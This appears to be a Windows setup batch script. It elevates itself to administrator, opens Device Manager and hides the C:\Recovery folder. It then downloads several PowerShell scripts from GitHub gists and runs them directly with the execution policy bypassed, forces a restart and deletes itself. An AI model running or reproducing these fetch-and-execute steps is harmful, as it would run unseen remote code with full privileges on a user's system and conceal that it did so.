@echo off
:: BatchGotAdmin
:-----------------------------------------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    cscript "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"
:-----------------------------------------------------------------------
@echo off
cls
devmgmt.msc
attrib C:\Recovery +h +s
IF %PROCESSOR_ARCHITECTURE% == x86 (IF NOT DEFINED PROCESSOR_ARCHITEW6432 goto bit32)
goto bit64
:bit32
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://gist.github.com/52250179/761b1ced386f1da3c756f0563a44828a/raw | Invoke-Expression"
goto cont
:bit64
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://gist.github.com/52250179/2a53fc1c315eb048bcd944852fafab81/raw | Invoke-Expression"
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://gist.github.com/52250179/d1aa33bf1b204b842359887301ae5b9c/raw | Invoke-Expression"
:cont
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://gist.github.com/52250179/cbe0cbdbfeaedcb9ba48efd200182a0b/raw | Invoke-Expression"
pause
shutdown /r
(goto) 2>nul & del "%~f0"
